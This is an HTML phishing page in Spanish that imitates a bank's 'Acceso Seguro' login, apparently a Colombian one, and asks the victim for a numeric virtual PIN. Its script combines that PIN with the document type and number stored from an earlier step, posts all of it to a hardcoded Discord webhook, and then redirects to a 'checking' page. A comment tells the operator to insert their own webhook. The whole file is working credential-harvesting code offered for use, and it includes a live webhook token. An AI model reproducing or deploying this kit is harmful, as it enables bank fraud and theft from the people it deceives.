<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Acceso Seguro</title>
    <style>
        * { box-sizing: border-box; outline: none; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f6f9;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .app-header {
            background-color: #E1111C;
            height: 250px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 1.5rem;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            z-index: 1;
        }
        .container {
            flex: 1;
            padding: 20px;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            padding-top: 30px;
            max-width: 480px;
            margin: 0 auto;
            width: 100%;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-size: 0.9rem;
            font-weight: 500;
            padding-left: 10px;
        }
        .input-group { margin-bottom: 25px; }
        
        input {
            width: 100%;
            padding: 15px 20px;
            border-radius: 30px;
            border: 1px solid #ddd;
            background-color: white;
            font-size: 1rem;
            color: #333;
            -webkit-appearance: none;
            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
            transition: border-color 0.3s;
        }
        input:focus { border-color: #E1111C; }
        
        .password-wrapper {
            position: relative;
            width: 100%;
        }
        .password-wrapper input {
            padding-right: 50px;
        }
        .toggle-password {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            width: 24px;
            height: 24px;
            fill: #666;
            user-select: none;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        button {
            width: 100%;
            padding: 16px;
            border-radius: 30px;
            border: none;
            background-color: #E1111C;
            color: white;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.3s ease;
        }
        button:hover, button:active {
            background-color: #ff4d55;
            box-shadow: 0 4px 10px rgba(225, 17, 28, 0.3);
        }
        button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        .links { text-align: center; margin-top: 20px; }
        .links a { color: #333; text-decoration: none; font-size: 0.9rem; font-weight: 600; }
    </style>
</head>
<body>
    <div class="app-header">
        <img src="Ybljjas.png" alt="Mi imagen" width="200" height="200">
    </div>
    <div class="container">
        <form id="step2Form">
            <div class="input-group">
                <label>Ingrese su clave virtual</label>
                <div class="password-wrapper">
                    <input 
                        type="password" 
                        id="up1" 
                        placeholder="Clave virtual" 
                        inputmode="numeric" 
                        pattern="[0-9]*" 
                        minlength="6" 
                        maxlength="8" 
                        oninput="this.value = this.value.replace(/[^0-9]/g, '')"
                        required>
                    <span class="toggle-password" id="toggleEye">
                        <svg viewBox="0 0 24 24" width="20" height="20">
                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                        </svg>
                    </span>
                </div>
            </div>

            <div class="links" style="margin-bottom: 30px;">
                <a href="#">¬øOlvid√≥ o bloque√≥ su clave virtual?</a>
            </div>
            <button type="submit" id="btnIngresar">Ingresar</button>
        </form>
    </div>

    <script>
        // ‚ö†Ô∏è IMPORTANTE: Reemplaza esta URL con tu Webhook de Discord
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1442967165413232754/otiUgJhiF8S5-EGS9frT16ZlYAOYePGfHQ4fp81pq6dCPIuxeMbI67ilMYI-pRlzxeAi';

        // L√≥gica para mostrar/ocultar contrase√±a
        const toggleEye = document.getElementById('toggleEye');
        const passwordInput = document.getElementById('up1');

        toggleEye.addEventListener('click', function () {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.style.fill = type === 'text' ? '#E1111C' : '#666';
        });

        // L√≥gica del formulario Paso 2
        document.getElementById('step2Form').addEventListener('submit', async function(e) {
            e.preventDefault();

            const up1 = document.getElementById('up1').value;
            const btnIngresar = document.getElementById('btnIngresar');

            // Validaci√≥n de longitud
            if (up1.length < 6 || up1.length > 8) {
                alert('La clave debe tener entre 6 y 8 d√≠gitos.');
                return;
            }

            // Recuperar datos del paso 1
            const tipo = sessionStorage.getItem('userTipo') || 'No especificado';
            const documento = sessionStorage.getItem('userDocumento') || 'No especificado';

            // Deshabilitar bot√≥n mientras se env√≠a
            btnIngresar.disabled = true;
            btnIngresar.textContent = 'Verificando...';

            try {
                // Enviar TODO a Discord (Paso 1 + Paso 2)
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: 'üîê **Datos completos de ingreso**',
                        embeds: [{
                            title: '‚úÖ Registro Completo - Step 2',
                            color: 0xE1111C,
                            fields: [
                                {
                                    name: 'üìÑ Tipo de Documento',
                                    value: tipo,
                                    inline: true
                                },
                                {
                                    name: 'üî¢ N√∫mero de Documento',
                                    value: documento,
                                    inline: true
                                },
                                {
                                    name: 'üîë Clave Virtual',
                                    value: '`' + up1 + '`',
                                    inline: false
                                },
                                {
                                    name: '‚è∞ Fecha y Hora',
                                    value: new Date().toLocaleString('es-CO', { 
                                        timeZone: 'America/Bogota' 
                                    }),
                                    inline: false
                                }
                            ],
                            footer: {
                                text: 'Step 2 completado'
                            },
                            timestamp: new Date().toISOString()
                        }]
                    })
                });

                if (response.ok) {
                    // Guardar clave en sessionStorage
                    sessionStorage.setItem('up1', up1);

                    // Redirigir a comprobando.html
                    setTimeout(() => {
                        window.location.href = 'comprobando.html';
                    }, 1500);
                } else {
                    throw new Error('Error en el env√≠o');
                }
            } catch (error) {
                console.error('Error:', error);
                
                btnIngresar.disabled = false;
                btnIngresar.textContent = 'Ingresar';
            }
        });
    </script>
</body>
</html>
